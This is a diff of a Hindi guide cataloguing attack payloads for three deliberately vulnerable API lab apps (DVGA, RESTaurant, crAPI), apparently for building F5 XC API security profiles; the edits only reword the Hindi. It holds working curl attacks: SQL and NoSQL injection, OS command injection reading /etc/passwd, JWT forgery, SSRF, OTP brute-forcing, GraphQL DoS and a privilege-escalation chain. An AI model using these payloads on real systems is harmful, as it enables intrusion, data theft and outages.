@@ -13,15 +13,15 @@ i18n:
 
 ## अवलोकन
 
-यह गाइड तीन API सुरक्षा परीक्षण एप्लिकेशन में प्रत्येक API एंडपॉइंट, जानबूझकर रखी गई भेद्यता, और अटैक पेलोड को कैटलॉग करता है। F5 XC API सुरक्षा प्रोफ़ाइल विकास के लिए ट्रैफ़िक जनरेशन पैटर्न बनाने हेतु इसका उपयोग करें।
+यह गाइड तीन API सुरक्षा परीक्षण अनुप्रयोगों में प्रत्येक API एंडपॉइंट, जानबूझकर रखी गई भेद्यता, और अटैक पेलोड को सूचीबद्ध करता है। इसका उपयोग F5 XC API सुरक्षा प्रोफ़ाइल विकास के लिए ट्रैफ़िक जनरेशन पैटर्न बनाने हेतु करें।
 
-| एप्लिकेशन | प्रोटोकॉल | पथ | पोर्ट | प्रमाणीकरण | भेद्यताएँ |
+| अनुप्रयोग | प्रोटोकॉल | पथ | पोर्ट | प्रमाणीकरण | भेद्यताएँ |
 |---|---|---|---|---|---|
 | **DVGA** | GraphQL | `/dvga/` | 80 | कोई नहीं (admin: admin/password) | 25 परिदृश्य |
 | **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 OWASP API 2023 श्रेणियाँ |
-| **crAPI** | REST (माइक्रोसर्विसेज) | `/` | 8888 | JWT (Bearer) | 18+ चुनौतियाँ |
+| **crAPI** | REST (microservices) | `/` | 8888 | JWT (Bearer) | 18+ चुनौतियाँ |
 
-### एनवायरनमेंट वेरिएबल
+### पर्यावरण चर
 
 ```bash
 ORIGIN="http://<ORIGIN_IP>"
@@ -36,7 +36,7 @@ CRAPI="http://<ORIGIN_IP>:8888"
 **GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
 **एडमिन क्रेडेंशियल:** admin / password
 
-सभी DVGA इंटरैक्शन एक ही एंडपॉइंट (`/dvga/graphql`) का उपयोग करते हैं जिसमें JSON `{"query":"..."}` पेलोड वाले POST अनुरोध होते हैं।
+सभी DVGA इंटरैक्शन एक ही एंडपॉइंट (`/dvga/graphql`) का उपयोग करते हैं, जिसमें JSON `{"query":"..."}` पेलोड वाले POST अनुरोध होते हैं।
 
 ### स्कीमा अवलोकन
 
@@ -44,7 +44,7 @@ CRAPI="http://<ORIGIN_IP>:8888"
 Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
 Mutations: createPaste, importPaste, uploadPaste
 Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
-          OwnerObject (id, username, pastes)  ← परिपत्र संदर्भ
+          OwnerObject (id, username, pastes)  ← circular reference
 ```
 
 ### एंडपॉइंट संदर्भ
@@ -53,17 +53,17 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
 |---|---|---|---|
 | `pastes(public, filter, limit)` | Query | नहीं | पेस्ट सूचीबद्ध करें (filter के माध्यम से SQL इंजेक्शन) |
 | `paste(id)` | Query | नहीं | एकल पेस्ट प्राप्त करें |
-| `me(token)` | Query | नहीं | JWT द्वारा उपयोगकर्ता प्राप्त करें (जालसाज़ी संवेदनशील) |
-| `systemHealth` | Query | नहीं | स्वास्थ्य जांच |
-| `systemUpdate` | Query | नहीं | धीमी क्वेरी (~82 सेकंड, DoS वेक्टर) |
-| `systemDiagnostics(cmd)` | Query | admin/password | अनुमत OS कमांड निष्पादित करें |
-| `createPaste(title, content, public)` | Mutation | नहीं | पेस्ट बनाएँ (content के माध्यम से XSS) |
-| `importPaste(host, port, path, scheme)` | Mutation | नहीं | दूरस्थ पेस्ट आयात करें (SSRF, कमांड इंजेक्शन) |
-| `uploadPaste(filename, content)` | Mutation | नहीं | पेस्ट अपलोड करें (पथ ट्रैवर्सल) |
+| `me(token)` | Query | नहीं | JWT द्वारा उपयोगकर्ता प्राप्त करें (जालसाजी के लिए संवेदनशील) |
+| `systemHealth` | Query | नहीं | स्वास्थ्य जाँच |
+| `systemUpdate` | Query | नहीं | धीमी क्वेरी (~82s, DoS वेक्टर) |
+| `systemDiagnostics(cmd)` | Query | admin/password | श्वेतसूचीबद्ध OS कमांड निष्पादित करें |
+| `createPaste(title, content, public)` | Mutation | नहीं | पेस्ट बनाएं (content के माध्यम से XSS) |
+| `importPaste(host, port, path, scheme)` | Mutation | नहीं | रिमोट पेस्ट आयात करें (SSRF, कमांड इंजेक्शन) |
+| `uploadPaste(filename, content)` | Mutation | नहीं | पेस्ट अपलोड करें (पथ अनुक्रमण) |
 
 ### भेद्यता कैटलॉग
 
-#### 1. सेवा अस्वीकार (DoS) (6 परिदृश्य)
+#### 1. सेवा से इनकार / Denial of Service (6 परिदृश्य)
 
 **बैच क्वेरी अटैक:**
 ```bash
@@ -72,28 +72,28 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
 ```
 
-**गहरी पुनरावृत्ति (परिपत्र Owner/Paste संदर्भ):**
+**गहरा पुनरावर्तन (circular Owner/Paste संदर्भ):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
 ```
 
-**संसाधन गहन क्वेरी (~82 सेकंड प्रतिक्रिया):**
+**संसाधन-गहन क्वेरी (~82 सेकंड प्रतिक्रिया):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{systemUpdate}"}'
 ```
 
-**फील्ड डुप्लिकेशन (फील्ड को 500+ बार दोहराएँ):**
+**फ़ील्ड दोहराव (500+ बार फ़ील्ड दोहराएँ):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**एलियास-आधारित अटैक (1000 एलियास ऑपरेशन):**
+**एलियास-आधारित अटैक (1000 एलियास्ड ऑपरेशन):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -102,21 +102,21 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 2. सूचना प्रकटीकरण (5 परिदृश्य)
 
-**इंट्रोस्पेक्शन (पूर्ण स्कीमा एन्यूमरेशन):**
+**इंट्रोस्पेक्शन (पूर्ण स्कीमा गणना):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**फील्ड सुझाव (टाइपो से मान्य फील्ड का पता चलता है):**
+**फ़ील्ड सुझाव (टाइपो से वैध फ़ील्ड उजागर होती हैं):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{titl}}"}'
 ```
 
-**importPaste के माध्यम से SSRF (आंतरिक सेवाओं की जांच):**
+**importPaste के माध्यम से SSRF (आंतरिक सेवाओं की जाँच):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -132,7 +132,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
 ```
 
-**createPaste के माध्यम से संग्रहीत XSS:**
+**createPaste के माध्यम से Stored XSS:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -164,14 +164,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 5. प्राधिकरण बाईपास (3 परिदृश्य)
 
-**JWT टोकन जालसाज़ी (बिना हस्ताक्षर वाले टोकन स्वीकार करता है):**
+**JWT टोकन जालसाजी (अहस्ताक्षरित टोकन स्वीकार करता है):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
 ```
 
-**uploadPaste के माध्यम से मनमाना फ़ाइल लेखन (पथ ट्रैवर्सल):**
+**uploadPaste के माध्यम से मनमाना फ़ाइल लेखन (पथ अनुक्रमण):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -183,9 +183,9 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 ## RESTaurant API (Damn Vulnerable RESTaurant)
 
 **Swagger UI:** `${ORIGIN}/restaurant/docs`
-**OpenAPI स्पेक:** `${ORIGIN}/restaurant/openapi.json`
+**OpenAPI Spec:** `${ORIGIN}/restaurant/openapi.json`
 **प्रमाणीकरण:** `/restaurant/token` पर form-encoded POST के माध्यम से JWT
-**भूमिकाएँ:** Customer (डिफ़ॉल्ट), Employee, Chef (एडमिन)
+**भूमिकाएँ:** Customer (डिफ़ॉल्ट), Employee, Chef (admin)
 
 ### सेटअप: पंजीकरण और प्रमाणीकरण
 
@@ -205,21 +205,21 @@ echo "Bearer token: ${TOKEN}"
 
 ### एंडपॉइंट संदर्भ
 
-| एंडपॉइंट | मेथड | प्रमाणीकरण | भूमिका | भेद्यता |
+| एंडपॉइंट | विधि | प्रमाणीकरण | भूमिका | भेद्यता |
 |---|---|---|---|---|
 | `/restaurant/register` | POST | नहीं | — | उपयोगकर्ता निर्माण |
-| `/restaurant/token` | POST | नहीं | — | कमज़ोर सीक्रेट (97952) वाला JWT |
-| `/restaurant/healthcheck` | GET | नहीं | — | स्वास्थ्य जांच |
+| `/restaurant/token` | POST | नहीं | — | कमज़ोर secret के साथ JWT (97952) |
+| `/restaurant/healthcheck` | GET | नहीं | — | स्वास्थ्य जाँच |
 | `/restaurant/profile` | GET | हाँ | कोई भी | उपयोगकर्ता प्रोफ़ाइल |
 | `/restaurant/profile` | PUT | हाँ | कोई भी | **BOLA** (अन्य उपयोगकर्ताओं को संशोधित करें) |
-| `/restaurant/profile` | PATCH | हाँ | कोई भी | **BOPLA** (भूमिका का सामूहिक असाइनमेंट) |
-| `/restaurant/users/update_role` | PUT | हाँ | कोई भी | **BFLA** (भूमिका वृद्धि) |
+| `/restaurant/profile` | PATCH | हाँ | कोई भी | **BOPLA** (mass assign role) |
+| `/restaurant/users/update_role` | PUT | हाँ | कोई भी | **BFLA** (भूमिका उन्नयन) |
 | `/restaurant/menu` | GET | हाँ | कोई भी | मेनू आइटम सूचीबद्ध करें |
-| `/restaurant/menu` | PUT | हाँ | Employee+ | मेनू बनाएँ (इमेज के माध्यम से **SSRF**) |
-| `/restaurant/menu/{item_id}` | PUT | हाँ | Employee+ | मेनू अपडेट करें (इमेज के माध्यम से **SSRF**) |
+| `/restaurant/menu` | PUT | हाँ | Employee+ | मेनू बनाएं (**SSRF** image के माध्यम से) |
+| `/restaurant/menu/{item_id}` | PUT | हाँ | Employee+ | मेनू अपडेट करें (**SSRF** image के माध्यम से) |
 | `/restaurant/menu/{item_id}` | DELETE | हाँ | कोई भी | **BFLA** (कोई भी उपयोगकर्ता हटा सकता है) |
 | `/restaurant/orders` | GET | हाँ | कोई भी | **BOLA** (सभी ऑर्डर देखें) |
-| `/restaurant/orders` | POST | हाँ | कोई भी | ऑर्डर बनाएँ |
+| `/restaurant/orders` | POST | हाँ | कोई भी | ऑर्डर बनाएं |
 | `/restaurant/orders/{order_id}` | GET | हाँ | कोई भी | **BOLA** (अन्य ऑर्डर तक पहुँच) |
 | `/restaurant/orders/status/{order_id}` | GET | हाँ | कोई भी | ऑर्डर स्थिति |
 | `/restaurant/admin/stats/disk` | GET | हाँ | Chef | **कमांड इंजेक्शन** |
@@ -231,9 +231,9 @@ echo "Bearer token: ${TOKEN}"
 
 ### भेद्यता कैटलॉग
 
-#### API1:2023 — टूटा हुआ ऑब्जेक्ट स्तर प्राधिकरण (BOLA)
+#### API1:2023 — Broken Object Level Authorization (BOLA)
 
-**दूसरे उपयोगकर्ता की प्रोफ़ाइल संशोधित करें:**
+**किसी अन्य उपयोगकर्ता की प्रोफ़ाइल संशोधित करें:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -241,7 +241,7 @@ curl -X PUT ${ORIGIN}/restaurant/profile \
   -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
 ```
 
-**अन्य उपयोगकर्ताओं के ऑर्डर तक पहुँचें (ऑफसेट एन्यूमरेट करें):**
+**अन्य उपयोगकर्ताओं के ऑर्डर तक पहुँच (offset गणना करें):**
 ```bash
 for i in 1 2 3 4 5; do
   curl -sf ${ORIGIN}/restaurant/orders/${i} \
@@ -250,22 +250,22 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### API2:2023 — टूटा हुआ प्रमाणीकरण
+#### API2:2023 — Broken Authentication
 
-**JWT कमज़ोर सीक्रेट ब्रूट-फोर्स (सीक्रेट 6 अंकों का है: 97952):**
+**JWT कमज़ोर secret ब्रूट-फ़ोर्स (secret 6 अंक है: 97952):**
 ```bash
-# jwt.io पर टोकन डीकोड और जालसाज़ी करें
-# सीक्रेट: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' से ब्रूट-फोर्स योग्य)
+# jwt.io पर टोकन डीकोड और जाली बनाएं
+# Secret: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' से ब्रूट-फ़ोर्स योग्य)
 
-# Chef टोकन जालसाज़ी करें:
+# Chef टोकन जाली बनाएं:
 # Header: {"alg":"HS256","typ":"JWT"}
 # Payload: {"sub":"chef","exp":9999999999}
-# सीक्रेट 97952 से हस्ताक्षर करें
+# Secret से साइन करें: 97952
 ```
 
-#### API3:2023 — टूटा हुआ ऑब्जेक्ट प्रॉपर्टी स्तर प्राधिकरण (BOPLA)
+#### API3:2023 — Broken Object Property Level Authorization (BOPLA)
 
-**Customer से Chef तक भूमिका का सामूहिक असाइनमेंट:**
+**Customer से Chef तक भूमिका mass-assign करें:**
 ```bash
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -273,30 +273,30 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -d '{"role":"Chef"}'
 ```
 
-**वृद्धि पथ: Customer → Employee → Chef:**
+**उन्नयन पथ: Customer → Employee → Chef:**
 ```bash
-# चरण 1: Employee तक वृद्धि
+# चरण 1: Employee तक उन्नयन
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Employee"}'
 
-# चरण 2: Chef तक वृद्धि
+# चरण 2: Chef तक उन्नयन
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 ```
 
-#### API5:2023 — टूटा हुआ फंक्शन स्तर प्राधिकरण (BFLA)
+#### API5:2023 — Broken Function Level Authorization (BFLA)
 
-**Customer के रूप में मेनू आइटम हटाएँ (Employee+ आवश्यक होना चाहिए):**
+**Customer के रूप में मेनू आइटम हटाएं (Employee+ आवश्यक होना चाहिए):**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-**दूसरे उपयोगकर्ता की भूमिका बदलें:**
+**किसी अन्य उपयोगकर्ता की भूमिका बदलें:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -304,22 +304,22 @@ curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -d '{"username":"chef","role":"Customer"}'
 ```
 
-#### API7:2023 — सर्वर-साइड अनुरोध जालसाज़ी (SSRF)
+#### API7:2023 — Server-Side Request Forgery (SSRF)
 
-**मेनू image_url के माध्यम से आंतरिक एंडपॉइंट की जांच करें (Employee भूमिका आवश्यक):**
+**मेनू image_url के माध्यम से आंतरिक एंडपॉइंट की जाँच (Employee भूमिका आवश्यक):**
 ```bash
-# पहले BOPLA के माध्यम से Employee तक वृद्धि करें, फिर:
+# पहले BOPLA के माध्यम से Employee तक उन्नयन करें, फिर:
 curl -X PUT ${ORIGIN}/restaurant/menu \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
 ```
 
-#### API8:2023 — इंजेक्शन
+#### API8:2023 — Injection
 
-**डिस्क स्टैट्स के माध्यम से OS कमांड इंजेक्शन (Chef भूमिका आवश्यक):**
+**disk stats के माध्यम से OS कमांड इंजेक्शन (Chef भूमिका आवश्यक):**
 ```bash
-# Chef तक वृद्धि के बाद:
+# Chef तक उन्नयन के बाद:
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
   -H "Authorization: Bearer ${TOKEN}"
 
@@ -330,7 +330,7 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
 ### पूर्ण अटैक चेन: Customer से Root तक
 
 ```bash
-# 1. पंजीकरण
+# 1. पंजीकरण करें
 curl -X POST ${ORIGIN}/restaurant/register \
   -H "Content-Type: application/json" \
   -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'
@@ -339,13 +339,13 @@ curl -X POST ${ORIGIN}/restaurant/register \
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
-# 3. Chef तक वृद्धि (BOPLA)
+# 3. Chef तक उन्नयन (BOPLA)
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 
-# 4. Chef-स्तर टोकन प्राप्त करने के लिए पुनः प्रमाणीकरण
+# 4. Chef-स्तर का टोकन पाने के लिए पुनः प्रमाणीकरण करें
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
@@ -360,19 +360,19 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 
 **वेब UI:** `${CRAPI}/`
 **MailHog:** `${CRAPI}/mailhog/` (सत्यापन के लिए ईमेल कैप्चर)
-**प्रमाणीकरण:** JWT Bearer टोकन (RS256, एल्गोरिथम कन्फ्यूज़न के प्रति संवेदनशील)
-**आर्किटेक्चर:** 7 माइक्रोसर्विसेज (identity, community, workshop, postgres, mongo, mailhog, web)
+**प्रमाणीकरण:** JWT Bearer टोकन (RS256, एल्गोरिदम भ्रम के लिए संवेदनशील)
+**आर्किटेक्चर:** 7 माइक्रोसर्विस (identity, community, workshop, postgres, mongo, mailhog, web)
 
 ### सेटअप: पंजीकरण, ईमेल सत्यापन, लॉगिन
 
 ```bash
-# 1. पंजीकरण
+# 1. पंजीकरण करें
 curl -X POST ${CRAPI}/identity/api/auth/signup \
   -H "Content-Type: application/json" \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
-# 2. सत्यापन ईमेल के लिए MailHog जांचें
-# ${CRAPI}/mailhog/ पर ब्राउज़ करें या MailHog API का उपयोग करें:
+# 2. सत्यापन ईमेल के लिए MailHog जाँचें
+# ${CRAPI}/mailhog/ ब्राउज़ करें या MailHog API का उपयोग करें:
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
 msgs = json.load(sys.stdin)['items']
@@ -390,73 +390,73 @@ echo "Bearer token: ${TOKEN}"
 
 ### एंडपॉइंट संदर्भ
 
-#### आइडेंटिटी सर्विस
+#### Identity सेवा
 
-| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
+| एंडपॉइंट | विधि | प्रमाणीकरण | भेद्यता |
 |---|---|---|---|
 | `/identity/api/auth/signup` | POST | नहीं | पंजीकरण |
-| `/identity/api/auth/login` | POST | नहीं | JWT टोकन (एल्गोरिथम कन्फ्यूज़न) |
+| `/identity/api/auth/login` | POST | नहीं | JWT टोकन (एल्गोरिदम भ्रम) |
 | `/identity/api/auth/forget-password` | POST | नहीं | OTP अनुरोध |
-| `/identity/api/auth/v2/check-otp` | POST | नहीं | **कोई रेट लिमिट नहीं** (4-अंकीय OTP ब्रूट-फोर्स) |
-| `/identity/api/auth/v3/check-otp` | POST | नहीं | रेट-लिमिटेड संस्करण |
+| `/identity/api/auth/v2/check-otp` | POST | नहीं | **दर सीमा नहीं** (4-अंकीय OTP ब्रूट-फ़ोर्स) |
+| `/identity/api/auth/v3/check-otp` | POST | नहीं | दर-सीमित संस्करण |
 | `/identity/api/v2/user/dashboard` | GET | हाँ | उपयोगकर्ता प्रोफ़ाइल |
 | `/identity/api/v2/user/change-email` | PUT | हाँ | ईमेल परिवर्तन |
-| `/identity/api/v2/vehicle/vehicles` | GET | हाँ | वाहन सूचीबद्ध करें (UUID लीक होते हैं) |
+| `/identity/api/v2/vehicle/vehicles` | GET | हाँ | वाहन सूचीबद्ध करें (UUID लीक करता है) |
 | `/identity/api/v2/vehicle/{uuid}/location` | GET | हाँ | **BOLA** (किसी भी उपयोगकर्ता का वाहन) |
 | `/identity/api/v2/user/videos` | POST | हाँ | वीडियो अपलोड |
 | `/identity/api/v2/user/videos/{id}` | GET | हाँ | **डेटा एक्सपोज़र** (conversion_params) |
-| `/identity/api/v2/user/videos/{id}` | PUT | हाँ | **सामूहिक असाइनमेंट** (कमांड इंजेक्शन) |
-| `/identity/api/v2/admin/videos/{id}` | DELETE | हाँ | **BFLA** (कोई एडमिन जांच नहीं) |
+| `/identity/api/v2/user/videos/{id}` | PUT | हाँ | **Mass assignment** (कमांड इंजेक्शन) |
+| `/identity/api/v2/admin/videos/{id}` | DELETE | हाँ | **BFLA** (कोई एडमिन जाँच नहीं) |
 
-#### कम्युनिटी सर्विस
+#### Community सेवा
 
-| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
+| एंडपॉइंट | विधि | प्रमाणीकरण | भेद्यता |
 |---|---|---|---|
-| `/community/api/v2/community/posts` | GET | हाँ | **डेटा एक्सपोज़र** (vehicle_id, email लीक) |
-| `/community/api/v2/community/posts` | POST | हाँ | ब्लॉग पोस्ट बनाएँ |
+| `/community/api/v2/community/posts` | GET | हाँ | **डेटा एक्सपोज़र** (vehicle_id, email लीक करता है) |
+| `/community/api/v2/community/posts` | POST | हाँ | ब्लॉग पोस्ट बनाएं |
 | `/community/api/v2/community/posts/{id}/comments` | POST | हाँ | टिप्पणी जोड़ें |
 | `/community/api/v2/coupon/validate-coupon` | POST | हाँ | **NoSQL इंजेक्शन** |
 
-#### वर्कशॉप सर्विस
+#### Workshop सेवा
 
-| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
+| एंडपॉइंट | विधि | प्रमाणीकरण | भेद्यता |
 |---|---|---|---|
 | `/workshop/api/mechanic` | GET | हाँ | **डेटा एक्सपोज़र** (मैकेनिक ईमेल) |
-| `/workshop/api/mechanic/mechanic_report` | GET | नहीं | **BOLA** (कोई प्रमाणीकरण नहीं, क्रमिक ID) |
+| `/workshop/api/mechanic/mechanic_report` | GET | नहीं | **BOLA** (कोई auth नहीं, अनुक्रमिक ID) |
 | `/workshop/api/merchant/contact_mechanic` | POST | हाँ | **SSRF** + **DoS** |
 | `/workshop/api/shop/products` | GET | हाँ | उत्पाद कैटलॉग |
-| `/workshop/api/shop/orders/` | POST | हाँ | ऑर्डर बनाएँ |
+| `/workshop/api/shop/orders/` | POST | हाँ | ऑर्डर बनाएं |
 | `/workshop/api/shop/orders/all` | GET | हाँ | ऑर्डर सूचीबद्ध करें |
-| `/workshop/api/shop/orders/{id}` | GET | नहीं | **BOLA** (कोई प्रमाणीकरण आवश्यक नहीं) |
-| `/workshop/api/shop/orders/{id}` | PUT | हाँ | **सामूहिक असाइनमेंट** (status, quantity) |
+| `/workshop/api/shop/orders/{id}` | GET | नहीं | **BOLA** (कोई auth आवश्यक नहीं) |
+| `/workshop/api/shop/orders/{id}` | PUT | हाँ | **Mass assignment** (status, quantity) |
 | `/workshop/api/shop/apply_coupon` | POST | हाँ | **SQL इंजेक्शन** |
 
 ### चुनौती कैटलॉग
 
-#### चुनौती 1 — BOLA: दूसरे उपयोगकर्ता के वाहन स्थान तक पहुँच
+#### चुनौती 1 — BOLA: किसी अन्य उपयोगकर्ता के वाहन का स्थान प्राप्त करें
 
 ```bash
 # पहले अपना वाहन UUID प्राप्त करें
 curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
   -H "Authorization: Bearer ${TOKEN}"
 
-# दूसरे उपयोगकर्ता के वाहन तक पहुँचें (UUID बदलें)
+# किसी अन्य उपयोगकर्ता के वाहन तक पहुँच (UUID बदलें)
 curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### चुनौती 2 — BOLA: मैकेनिक रिपोर्ट तक पहुँच (कोई प्रमाणीकरण नहीं)
+#### चुनौती 2 — BOLA: मैकेनिक रिपोर्ट तक पहुँच (बिना Auth के)
 
 ```bash
-# क्रमिक ID एन्यूमरेशन — कोई टोकन आवश्यक नहीं
+# अनुक्रमिक ID गणना — कोई टोकन आवश्यक नहीं
 for i in 1 2 3 4 5; do
-  echo "रिपोर्ट $i:"
+  echo "Report $i:"
   curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
   echo ""
 done
 ```
 
-#### चुनौती 3 — टूटा हुआ प्रमाणीकरण: पासवर्ड रीसेट OTP ब्रूट-फोर्स
+#### चुनौती 3 — Broken Auth: पासवर्ड रीसेट OTP ब्रूट-फ़ोर्स
 
 ```bash
 # पीड़ित के लिए OTP अनुरोध करें
@@ -464,7 +464,7 @@ curl -X POST ${CRAPI}/identity/api/auth/forget-password \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
-# 4-अंकीय OTP ब्रूट-फोर्स (v2 में कोई रेट लिमिटिंग नहीं)
+# 4-अंकीय OTP ब्रूट-फ़ोर्स (v2 में कोई दर सीमा नहीं)
 for otp in $(seq -w 0000 9999); do
   RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
     -H "Content-Type: application/json" \
@@ -473,7 +473,7 @@ for otp in $(seq -w 0000 9999); do
 done
 ```
 
-#### चुनौती 4 — डेटा एक्सपोज़र: मैकेनिक ईमेल लीक
+#### चुनौती 4 — डेटा एक्सपोज़र: मैकेनिक ईमेल लीक करें
 
 ```bash
 curl -sf ${CRAPI}/workshop/api/mechanic \
@@ -483,13 +483,13 @@ curl -sf ${CRAPI}/workshop/api/mechanic \
 #### चुनौती 5 — डेटा एक्सपोज़र: आंतरिक वीडियो रूपांतरण पैरामीटर
 
 ```bash
-# एक वीडियो अपलोड करें, फिर प्रतिक्रिया का निरीक्षण करें
+# एक वीडियो अपलोड करें, फिर प्रतिक्रिया की जाँच करें
 curl -sf ${CRAPI}/identity/api/v2/user/videos \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
-# प्रतिक्रिया में conversion_params फील्ड देखें
+# प्रतिक्रिया में conversion_params फ़ील्ड देखें
 ```
 
-#### चुनौती 6 — DoS: कॉन्टैक्ट मैकेनिक के माध्यम से लेयर 7
+#### चुनौती 6 — DoS: Contact Mechanic के माध्यम से Layer 7
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -505,7 +505,7 @@ curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
   }'
 ```
 
-#### चुनौती 7 — BFLA: एडमिन एंडपॉइंट के माध्यम से वीडियो हटाएँ
+#### चुनौती 7 — BFLA: एडमिन एंडपॉइंट के माध्यम से वीडियो हटाएं
 
 ```bash
 # सामान्य उपयोगकर्ता एडमिन एंडपॉइंट तक पहुँच सकता है
@@ -513,7 +513,7 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### चुनौती 8 और 9 — सामूहिक असाइनमेंट: ऑर्डर हेरफेर के माध्यम से मुफ़्त आइटम
+#### चुनौतियाँ 8 और 9 — Mass Assignment: ऑर्डर हेरफेर के माध्यम से मुफ़्त आइटम
 
 ```bash
 # GET को PUT में बदलें, status और quantity संशोधित करें
@@ -532,7 +532,7 @@ curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
   -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
 ```
 
-#### चुनौती 11 — कॉन्टैक्ट मैकेनिक के माध्यम से SSRF
+#### चुनौती 11 — Contact Mechanic के माध्यम से SSRF
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -557,7 +557,7 @@ curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
   -d '{"coupon_code":{"$ne":1}}'
 ```
 
-#### चुनौती 13 — SQL इंजेक्शन: कूपन कई बार रिडीम करें
+#### चुनौती 13 — SQL इंजेक्शन: कूपन एकाधिक बार रिडीम करें
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
@@ -566,7 +566,7 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### चुनौती 14 — बिना प्रमाणीकरण ऑर्डर पहुँच
